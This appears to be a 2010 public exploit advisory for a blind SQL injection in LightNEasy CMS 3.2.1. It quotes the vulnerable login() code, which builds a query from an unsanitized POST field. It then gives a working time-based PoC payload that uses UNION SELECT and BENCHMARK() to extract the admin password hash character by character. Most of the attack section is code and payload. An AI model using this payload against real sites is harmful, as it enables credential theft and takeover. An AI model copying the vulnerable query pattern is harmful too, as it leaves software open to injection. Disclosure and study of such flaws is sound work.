@@ -1,0 +1,43 @@
+# Exploit Title: LightNEasy Cms 3.2.1 Blind SQL Injection Vulnerability
+# Date: 20.09.2010
+# Author: Stephan Sattler // Solidmedia.de
+# Software Website: http://www.lightneasy.org/
+# Software Link: http://www.lightneasy.org/addons/downloads/send.php?dlid=127
+# Version: 3.2.1
+# Special Thanks to: Dominik Landtwing
+ 
+ 
+[ Vulnerability]
+
+# Vulnerable Code:
+
+common.php line 112-148
+
+function login() {
+	global $message, $set, $langmessage, $prefix;
+	if($_SESSION[$set['password']]!="1") {
+	if($_GET['do']=="login" && $_POST['handle']!="") {
+		$result=dbquery('SELECT * FROM '.$prefix.'users WHERE handle="'.$_POST['handle'].'"');
+		if($row = fetch_array($result)) {
+			if($row['password'] == sha1($_POST['password'])) {
+					...
+
+}}}}}
+ 
+# Explanation:
+
+$_POST['handle'] isn't sanitized before executing the database query.
+
+
+Since the only user after a fresh install is the admin-user with id 1 and
+a normal visitor can't register we have to retrieve the admin hash by using benchmark().
+
+# Exploiting the Vulnerability // PoC:
+
+URL: http://localhost/LNE/LightNEasy.php?do=login
+
+Postdata:
+
+handle=" UNION SELECT IF(SUBSTRING(password,1 ,1) = CHAR(98), BENCHMARK(1000000, ENCODE('Slow','Down')), null),2,3,4,5,6,7,8,9,10,11 FROM lne_users WHERE id="1&password=&do=login&=Login
+
+This will trigger benchmark() if the first character of the admin hash is b.
